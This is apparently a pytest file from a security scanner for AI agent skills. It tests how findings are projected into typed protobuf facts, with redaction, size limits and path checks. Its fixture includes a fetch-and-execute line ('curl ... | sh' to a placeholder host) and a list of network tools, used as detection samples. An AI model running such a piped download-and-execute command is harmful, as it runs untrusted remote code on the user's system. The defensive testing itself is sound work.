# Copyright 2026 Cisco Systems, Inc.
# SPDX-License-Identifier: Apache-2.0

"""Contract and safety-bound tests for the typed ScanFacts projection."""

from __future__ import annotations

from typing import Any

import pytest
from google.protobuf.descriptor import FieldDescriptor

from skill_scanner.core.models import Finding, Severity, ThreatCategory
from skill_scanner.core.semantic import FactLimits, ScanFactProjector, scan_facts_pb2


def _finding(
    rule_id: str = "COMPOUND_FETCH_EXECUTE",
    *,
    file_path: str = "scripts/run.sh",
    semantic_facts: dict[str, Any] | None = None,
) -> Finding:
    metadata: dict[str, Any] = {
        "untrusted_raw_metadata": "RAW-METADATA-SECRET-93f14",
    }
    metadata["semantic_facts"] = semantic_facts or {
        "evidence_kind": "pattern_match",
        "context_kind": "code",
    }
    return Finding(
        id=f"{rule_id}:7",
        rule_id=rule_id,
        category=ThreatCategory.TOOL_CHAINING_ABUSE,
        severity=Severity.HIGH,
        title="Fetch followed by execution",
        description="Description containing DESCRIPTION-SECRET-15a8b",
        file_path=file_path,
        line_number=7,
        snippet="curl https://user:SNIPPET-SECRET-722d@example.invalid | sh",
        analyzer="pipeline",
        metadata=metadata,
    )


def test_scan_facts_descriptor_is_closed_typed_and_versioned() -> None:
    """The only CEL input has concrete fields and no maps or dynamic Any values."""

    descriptor = scan_facts_pb2.ScanFacts.DESCRIPTOR
    assert descriptor.full_name == "skill_scanner.semantic.v1.ScanFacts"
    assert {
        name: (field.type, field.message_type.full_name if field.message_type else None)
        for name, field in descriptor.fields_by_name.items()
    } == {
        "schema_version": (FieldDescriptor.TYPE_STRING, None),
        "skill": (FieldDescriptor.TYPE_MESSAGE, "skill_scanner.semantic.v1.SkillFacts"),
        "candidate": (FieldDescriptor.TYPE_MESSAGE, "skill_scanner.semantic.v1.CandidateFacts"),
        "projection": (FieldDescriptor.TYPE_MESSAGE, "skill_scanner.semantic.v1.ProjectionStatus"),
    }

    expected_repeated = {
        "SkillFacts": {"declared_tools", "files", "commands", "urls", "flows", "reference_edges", "signals"},
        "CandidateFacts": {"cooccurring_rule_ids"},
        "CommandFact": {"argument_classes"},
        "FlowFact": {"transforms"},
        "ProjectionStatus": {"error_codes"},
    }
    for message in descriptor.file.message_types_by_name.values():
        repeated = {field.name for field in message.fields if field.label == FieldDescriptor.LABEL_REPEATED}
        assert repeated == expected_repeated.get(message.name, set())
        for field in message.fields:
            if field.message_type is not None:
                assert field.message_type.full_name != "google.protobuf.Any"
                assert field.message_type.GetOptions().map_entry is False

    projection_fields = descriptor.file.message_types_by_name["ProjectionStatus"].fields_by_name
    assert {name: (field.number, field.type) for name, field in projection_fields.items()} == {
        "complete": (1, FieldDescriptor.TYPE_BOOL),
        "error_codes": (2, FieldDescriptor.TYPE_STRING),
        "serialized_bytes": (3, FieldDescriptor.TYPE_UINT64),
        "truncated": (4, FieldDescriptor.TYPE_BOOL),
    }


def test_projection_contains_only_typed_facts_and_never_raw_content(make_skill: Any) -> None:
    skill = make_skill(
        {
            "SKILL.md": "---\nname: typed\ndescription: facts\n---\nINSTRUCTION-SECRET-0d81",
            "scripts/run.sh": "#!/bin/sh\necho FILE-CONTENT-SECRET-bd66\n",
        },
        name="typed-facts",
        description="A typed fact projection fixture",
    )
    skill.referenced_files = ["scripts/run.sh"]
    finding = _finding(
        semantic_facts={
            "evidence_kind": "command_pipeline",
            "context_kind": "code",
            "candidate_command": {
                "executable": "curl",
                "argument_classes": ["url", "pipe"],
                "downloads": True,
                "executes": True,
                "destructive": False,
                "privilege_change": False,
                "source_class": "network",
                "sink_class": "shell_execution",
                "file_path": "scripts/run.sh",
            },
            "candidate_url": {
                "scheme": "https",
                "host": "example.invalid",
                "domain_class": "untrusted",
                "trusted_installer": False,
                "method": "GET",
                "direction": "inbound",
                "file_path": "scripts/run.sh",
            },
            "candidate_flow": {
                "source_class": "network",
                "sink_class": "shell_execution",
                "transforms": ["pipe"],
                "cross_file": False,
                "source_path": "scripts/run.sh",
                "sink_path": "scripts/run.sh",
            },
        }
    )

    facts = ScanFactProjector().project(skill, finding, [finding])
    encoded = facts.SerializeToString(deterministic=True)

    assert facts.schema_version == "v1"
    assert facts.projection.complete is True
    assert facts.projection.truncated is False
    assert facts.skill.name == "typed-facts"
    assert facts.skill.has_description is True
    assert facts.candidate.rule_id == finding.rule_id
    assert facts.candidate.evidence_kind == "command_pipeline"
    assert facts.candidate.context_kind == "code"
    assert facts.candidate.command.downloads is True
    assert facts.candidate.command.executes is True
    assert facts.candidate.url.host == "example.invalid"
    assert facts.candidate.flow.sink_class == "shell_execution"
    assert facts.candidate.file.role == "code"
    assert facts.candidate.file.referenced is True

    for secret in (
        b"INSTRUCTION-SECRET-0d81",
        b"FILE-CONTENT-SECRET-bd66",
        b"SNIPPET-SECRET-722d",
        b"DESCRIPTION-SECRET-15a8b",
        b"RAW-METADATA-SECRET-93f14",
    ):
        assert secret not in encoded


def test_unrecognized_classification_is_redacted_before_serialization(make_skill: Any) -> None:
    secret = "raw_secret_classification_sentinel"
    skill = make_skill({"scripts/run.sh": "#!/bin/sh\n"})
    finding = _finding(
        semantic_facts={
            "evidence_kind": "command_pipeline",
            "context_kind": "code",
            "candidate_command": {
                "executable": "curl",
                "argument_classes": [],
                "downloads": True,
                "executes": False,
                "destructive": False,
                "privilege_change": False,
                "source_class": secret,
                "sink_class": "network",
                "file_path": "scripts/run.sh",
            },
        }
    )

    facts = ScanFactProjector().project(skill, finding, [finding])
    encoded = facts.SerializeToString(deterministic=True)

    assert secret.encode() not in encoded
    assert facts.candidate.command.source_class == "unknown"
    assert facts.projection.complete is False
    assert facts.projection.truncated is False
    assert list(facts.projection.error_codes) == ["INVALID_STRUCTURED_METADATA"]


def test_masked_candidate_projection_ignores_unaccessed_invalid_url_leaves(make_skill: Any) -> None:
    skill = make_skill({})
    finding = _finding(
        file_path="SKILL.md",
        semantic_facts={
            "evidence_kind": "command_sequence",
            "evidence_value_class": "untrusted_fetch_execute",
            "context_kind": "instruction",
            "candidate_url": {
                "scheme": "https",
                "host": "example.invalid",
                "domain_class": "public",
                "trusted_installer": False,
                # A URL mentioned by a non-network command has no request
                # method. This optional leaf is malformed only if CEL reads it.
                "method": "",
                "direction": "reference",
                "file_path": "SKILL.md",
            },
        },
    )
    projector = ScanFactProjector()
    selected = (
        "candidate.context_kind",
        "candidate.evidence_kind",
        "candidate.evidence_value_class",
        "candidate.url.domain_class",
        "candidate.url.trusted_installer",
    )
    prepared = projector.prepare(skill, [finding], required_paths=selected)

    masked = projector.project_candidate_for_paths(prepared, finding, selected)
    method_selected = projector.project_candidate_for_paths(
        prepared,
        finding,
        (*selected, "candidate.url.method"),
    )

    assert masked.projection.complete is True
    assert masked.candidate.url.domain_class == "public"
    assert masked.candidate.url.trusted_installer is False
    assert masked.candidate.url.method == ""
    assert method_selected.projection.complete is False
    assert method_selected.projection.truncated is False
    assert list(method_selected.projection.error_codes) == ["INVALID_STRUCTURED_METADATA"]


def test_file_fact_limit_is_hard_and_marks_projection_incomplete(make_skill: Any) -> None:
    skill = make_skill(
        {
            "scripts/one.sh": "#!/bin/sh\n",
            "scripts/two.sh": "#!/bin/sh\n",
        }
    )
    finding = _finding()

    facts = ScanFactProjector(FactLimits(max_files=1)).project(skill, finding, [finding])

    assert facts.skill.file_count == 3
    assert len(facts.skill.files) == 1
    assert facts.projection.complete is False
    assert facts.projection.truncated is True
    assert "FILE_FACT_LIMIT" in facts.projection.error_codes


def test_reference_edges_respect_combined_semantic_item_limit(make_skill: Any) -> None:
    skill = make_skill({})
    skill.referenced_files = ["z.sh", "a.sh", "m.sh"]
    finding = _finding(file_path="SKILL.md")

    facts = ScanFactProjector(FactLimits(max_semantic_items=2)).project(skill, finding, [finding])

    total_semantic_items = (
        len(facts.skill.commands)
        + len(facts.skill.urls)
        + len(facts.skill.flows)
        + len(facts.skill.reference_edges)
        + len(facts.skill.signals)
    )
    assert total_semantic_items <= 2
    assert [edge.target_path for edge in facts.skill.reference_edges] == ["a.sh", "m.sh"]
    assert facts.projection.complete is False
    assert facts.projection.truncated is True
    assert "SEMANTIC_FACT_LIMIT" in facts.projection.error_codes


def test_structured_items_share_one_combined_limit(make_skill: Any) -> None:
    skill = make_skill({})
    finding = _finding(
        file_path="SKILL.md",
        semantic_facts={
            "commands": [{"executable": "one"}, {"executable": "two"}],
            "urls": [{"host": "example.invalid"}],
            "flows": [{"source_class": "network", "sink_class": "execution"}],
        },
    )

    facts = ScanFactProjector(FactLimits(max_semantic_items=3)).project(skill, finding, [finding])

    total_semantic_items = (
        len(facts.skill.commands)
        + len(facts.skill.urls)
        + len(facts.skill.flows)
        + len(facts.skill.reference_edges)
        + len(facts.skill.signals)
    )
    assert total_semantic_items == 3
    assert facts.projection.complete is False
    assert facts.projection.truncated is True
    assert "SEMANTIC_FACT_LIMIT" in facts.projection.error_codes


def test_string_limit_truncates_on_utf8_boundary_and_forces_fail_open(make_skill: Any) -> None:
    skill = make_skill({}, name="alphabet", description="A sufficiently long description")
    finding = _finding(
        file_path="SKILL.md",
        semantic_facts={"context_kind": "code", "evidence_kind": "command"},
    )

    facts = ScanFactProjector(FactLimits(max_string_bytes=5)).project(skill, finding, [finding])

    assert len(facts.skill.name.encode("utf-8")) <= 5
    assert facts.candidate.context_kind == "code"
    assert len(facts.candidate.context_kind.encode("utf-8")) <= 5
    assert facts.projection.complete is False
    assert facts.projection.truncated is True
    assert "STRING_SIZE_LIMIT" in facts.projection.error_codes


def test_invalid_structured_metadata_is_not_coerced_into_dynamic_facts(make_skill: Any) -> None:
    skill = make_skill({})
    finding = _finding(
        file_path="SKILL.md",
        semantic_facts={
            "commands": "not-a-list",
            "urls": ["not-a-mapping"],
            "candidate_command": "not-a-mapping",
            "context_kind": {"dynamic": "object"},
        },
    )

    facts = ScanFactProjector().project(skill, finding, [finding])

    assert len(facts.skill.commands) == 0
    assert len(facts.skill.urls) == 0
    assert not facts.candidate.HasField("command")
    assert facts.candidate.context_kind == "unknown"
    assert facts.projection.complete is False
    assert facts.projection.truncated is False
    assert "INVALID_STRUCTURED_METADATA" in facts.projection.error_codes


def test_scalar_and_unordered_metadata_are_not_coerced_into_string_facts(make_skill: Any) -> None:
    skill = make_skill({})
    finding = _finding(
        file_path="SKILL.md",
        semantic_facts={
            "context_kind": 7,
            "candidate_command": {"argument_classes": {"url", "pipe"}},
        },
    )

    facts = ScanFactProjector().project(skill, finding, [finding])

    assert facts.candidate.context_kind == "unknown"
    assert list(facts.candidate.command.argument_classes) == []
    assert facts.projection.complete is False
    assert "INVALID_STRUCTURED_METADATA" in facts.projection.error_codes


def test_missing_path_stays_empty_instead_of_becoming_current_directory(make_skill: Any) -> None:
    skill = make_skill({})
    finding = _finding(file_path="")

    facts = ScanFactProjector().project(skill, finding, [finding])

    assert facts.candidate.file_path == ""
    assert facts.projection.complete is True


def test_missing_candidate_semantic_facts_forces_fail_open(make_skill: Any) -> None:
    skill = make_skill({})
    finding = _finding(file_path="SKILL.md")
    del finding.metadata["semantic_facts"]

    facts = ScanFactProjector().project(skill, finding, [finding])

    assert facts.projection.complete is False
    assert facts.projection.truncated is False
    assert list(facts.projection.error_codes) == ["MISSING_STRUCTURED_METADATA"]


def test_non_mapping_semantic_facts_and_candidate_values_force_fail_open(make_skill: Any) -> None:
    skill = make_skill({})
    malformed_root = _finding(file_path="SKILL.md")
    malformed_root.metadata["semantic_facts"] = "not-a-mapping"
    malformed_candidate = _finding(
        "SECOND_RULE",
        file_path="SKILL.md",
        semantic_facts={"candidate_command": "not-a-mapping"},
    )

    root_facts = ScanFactProjector().project(skill, malformed_root, [malformed_root])
    candidate_facts = ScanFactProjector().project(skill, malformed_candidate, [malformed_candidate])

    for facts in (root_facts, candidate_facts):
        assert facts.projection.complete is False
        assert "INVALID_STRUCTURED_METADATA" in facts.projection.error_codes


def test_structured_boole_reject_truthy_strings_and_integers(make_skill: Any) -> None:
    skill = make_skill({})
    finding = _finding(
        file_path="SKILL.md",
        semantic_facts={
            "evidence_kind": "command_pipeline",
            "context_kind": "code",
            "candidate_command": {
                "executable": "curl",
                "argument_classes": [],
                "downloads": "false",
                "executes": 1,
                "destructive": [],
                "privilege_change": None,
                "source_class": "network",
                "sink_class": "execution",
                "file_path": "SKILL.md",
            },
            "candidate_url": {
                "scheme": "https",
                "host": "example.invalid",
                "domain_class": "untrusted",
                "trusted_installer": "false",
                "method": "GET",
                "direction": "inbound",
                "file_path": "SKILL.md",
            },
            "candidate_flow": {
                "source_class": "network",
                "sink_class": "execution",
                "transforms": [],
                "cross_file": 1,
                "source_path": "SKILL.md",
                "sink_path": "SKILL.md",
            },
        },
    )

    facts = ScanFactProjector().project(skill, finding, [finding])

    assert facts.candidate.command.downloads is False
    assert facts.candidate.command.executes is False
    assert facts.candidate.command.destructive is False
    assert facts.candidate.command.privilege_change is False
    assert facts.candidate.url.trusted_installer is False
    assert facts.candidate.flow.cross_file is False
    assert facts.projection.complete is False
    assert list(facts.projection.error_codes) == ["INVALID_STRUCTURED_METADATA"]


def test_each_repeated_field_is_bounded_before_serialization(make_skill: Any) -> None:
    skill = make_skill({})
    skill.manifest.allowed_tools = ["Read", "WebFetch", "Shell"]
    candidate = _finding(
        file_path="SKILL.md",
        semantic_facts={
            "candidate_command": {
                "executable": "curl",
                "argument_classes": ["literal", "url", "pipe"],
            },
            "candidate_flow": {
                "source_class": "network",
                "sink_class": "execution",
                "transforms": ["decode", "extraction", "pipe"],
            },
        },
    )
    other_findings = [_finding(f"RULE_{index}", file_path="SKILL.md") for index in range(4)]

    facts = ScanFactProjector(FactLimits(max_repeated_items=2)).project(
        skill,
        candidate,
        [candidate, *other_findings],
    )

    assert list(facts.skill.declared_tools) == ["Read", "WebFetch"]
    assert list(facts.candidate.command.argument_classes) == ["literal", "url"]
    assert list(facts.candidate.flow.transforms) == ["decode", "extraction"]
    assert len(facts.candidate.cooccurring_rule_ids) <= 2
    assert facts.projection.complete is False
    assert facts.projection.truncated is True
    assert "REPEATED_FIELD_LIMIT" in facts.projection.error_codes


def test_candidate_evidence_count_limit_sets_explicit_truncation_status(make_skill: Any) -> None:
    skill = make_skill({})
    finding = _finding(
        file_path="SKILL.md",
        semantic_facts={
            "evidence_kind": "pattern_match",
            "context_kind": "code",
            "evidence_count": 3,
        },
    )

    facts = ScanFactProjector(FactLimits(max_repeated_items=2)).project(skill, finding, [finding])

    assert facts.candidate.evidence_count == 2
    assert facts.projection.complete is False
    assert facts.projection.truncated is True
    assert list(facts.projection.error_codes) == ["CANDIDATE_EVIDENCE_COUNT_LIMIT"]


def test_compiler_masked_projection_omits_unread_package_collections(make_skill: Any) -> None:
    skill = make_skill({})
    skill.manifest.allowed_tools = ["WebFetch"]
    candidate = _finding(file_path="SKILL.md")
    peers = [_finding(f"PEER_{index}", file_path="SKILL.md") for index in range(32)]
    projector = ScanFactProjector()
    prepared = projector.prepare(skill, [candidate, *peers])

    facts = projector.project_candidate_for_paths(
        prepared,
        candidate,
        ("candidate.context_kind", "candidate.evidence_kind", "skill.declares_network"),
    )

    assert facts.HasField("skill")
    assert facts.skill.declares_network is True
    assert list(facts.skill.signals) == []
    assert facts.candidate.rule_id == candidate.rule_id
    assert facts.projection.complete is True


def test_candidate_only_mask_uses_upb_repeated_field_cardinality(make_skill: Any) -> None:
    skill = make_skill({})
    candidate = _finding(file_path="SKILL.md")
    projector = ScanFactProjector()
    prepared = projector.prepare(skill, [candidate])

    facts = projector.project_candidate_for_paths(
        prepared,
        candidate,
        ("candidate.context_kind", "candidate.evidence_kind"),
    )

    assert facts.HasField("skill")
    assert facts.skill.ByteSize() == 0
    assert facts.projection.complete is True


def test_invalid_reference_only_invalidates_masks_that_read_reference_state(make_skill: Any) -> None:
    skill = make_skill({"scripts/run.sh": "#!/bin/sh\n"})
    skill.referenced_files = ["../outside-package"]
    candidate = _finding(file_path="scripts/run.sh")
    projector = ScanFactProjector()
    prepared = projector.prepare(
        skill,
        [candidate],
        required_paths=(
            "candidate.context_kind",
            "candidate.evidence_kind",
            "skill.files.referenced",
        ),
    )

    candidate_only = projector.project_candidate_for_paths(
        prepared,
        candidate,
        ("candidate.context_kind", "candidate.evidence_kind"),
    )
    reference_dependent = projector.project_candidate_for_paths(
        prepared,
        candidate,
        ("candidate.context_kind", "candidate.evidence_kind", "skill.files.referenced"),
    )

    assert candidate_only.projection.complete
    assert not reference_dependent.projection.complete
    assert list(reference_dependent.projection.error_codes) == ["INVALID_PATH"]


@pytest.mark.parametrize("tool", ["WebFetch", "curl", "wget", "HTTPClient", "network_request"])
def test_declared_network_tools_set_the_normalized_manifest_capability(
    make_skill: Any,
    tool: str,
) -> None:
    skill = make_skill({})
    skill.manifest.compatibility = None
    skill.manifest.allowed_tools = ["Read", tool]
    finding = _finding()

    facts = ScanFactProjector().project(skill, finding, [finding])

    assert facts.skill.declares_network is True


def test_non_network_allowed_tools_do_not_declare_network(make_skill: Any) -> None:
    skill = make_skill({})
    skill.manifest.compatibility = None
    skill.manifest.allowed_tools = ["Read", "Shell"]
    finding = _finding()

    facts = ScanFactProjector().project(skill, finding, [finding])

    assert facts.skill.declares_network is False


def test_hidden_relative_paths_are_preserved_and_equivalent_paths_correlate(make_skill: Any) -> None:
    skill = make_skill({".hidden/run.sh": "#!/bin/sh\n"})
    skill.referenced_files = ["./.hidden/run.sh"]
    candidate = _finding("CANDIDATE", file_path="./.hidden/run.sh")
    peer = _finding("PEER", file_path=".hidden/run.sh")

    facts = ScanFactProjector().project(skill, candidate, [candidate, peer])

    assert facts.projection.complete is True
    assert facts.candidate.file_path == ".hidden/run.sh"
    assert facts.candidate.file.hidden is True
    assert facts.candidate.file.referenced is True
    assert list(facts.candidate.cooccurring_rule_ids) == ["PEER"]


def test_pathless_findings_do_not_manufacture_same_path_cooccurrence(make_skill: Any) -> None:
    skill = make_skill({})
    candidate = _finding("CANDIDATE", file_path="")
    peer = _finding("PEER", file_path="")

    facts = ScanFactProjector().project(skill, candidate, [candidate, peer])

    assert facts.projection.complete is True
    assert list(facts.candidate.cooccurring_rule_ids) == []


def test_candidate_file_remains_absent_without_matching_package_file(make_skill: Any) -> None:
    skill = make_skill({})
    finding = _finding(
        file_path="missing.bin",
        semantic_facts={
            "evidence_kind": "binary_signature",
            "context_kind": "binary",
            "signals": [
                {
                    "rule_id": "COMPOUND_FETCH_EXECUTE",
                    "kind": "file_magic_mismatch",
                    "file_path": "missing.bin",
                    "value_class": "opaque_binary",
                }
            ],
        },
    )

    facts = ScanFactProjector().project(skill, finding, [finding])

    assert facts.projection.complete is True
    assert facts.candidate.file_path == "missing.bin"
    assert not facts.candidate.HasField("file")


def test_absolute_and_parent_traversal_paths_force_fail_open(make_skill: Any) -> None:
    skill = make_skill({})

    for unsafe_path in ("../scripts/run.sh", "/tmp/run.sh", "scripts/../../run.sh"):
        finding = _finding(file_path=unsafe_path)
        facts = ScanFactProjector().project(skill, finding, [finding])

        assert facts.candidate.file_path == ""
        assert facts.projection.complete is False
        assert "INVALID_PATH" in facts.projection.error_codes


def test_activation_size_is_measured_after_encoding_its_own_size_field(make_skill: Any) -> None:
    skill = make_skill({})
    finding = _finding(file_path="SKILL.md")
    baseline = ScanFactProjector().project(skill, finding, [finding])

    facts = ScanFactProjector(FactLimits(max_activation_bytes=baseline.projection.serialized_bytes - 1)).project(
        skill, finding, [finding]
    )

    assert facts.projection.serialized_bytes == facts.ByteSize()
    assert facts.projection.complete is False
    assert facts.projection.truncated is True
    assert "ACTIVATION_SIZE_LIMIT" in facts.projection.error_codes


def test_projection_is_byte_deterministic_and_cooccurrence_is_sorted(make_skill: Any) -> None:
    skill = make_skill({"scripts/run.sh": "#!/bin/sh\n"})
    candidate = _finding("CANDIDATE")
    findings = [
        candidate,
        _finding("Z_RULE"),
        _finding("A_RULE"),
        _finding("A_RULE"),
    ]
    projector = ScanFactProjector()

    first = projector.project(skill, candidate, findings)
    second = projector.project(skill, candidate, findings)

    assert list(first.candidate.cooccurring_rule_ids) == ["A_RULE", "Z_RULE"]
    assert first.SerializeToString(deterministic=True) == second.SerializeToString(deterministic=True)
    assert first.projection.serialized_bytes == second.projection.serialized_bytes
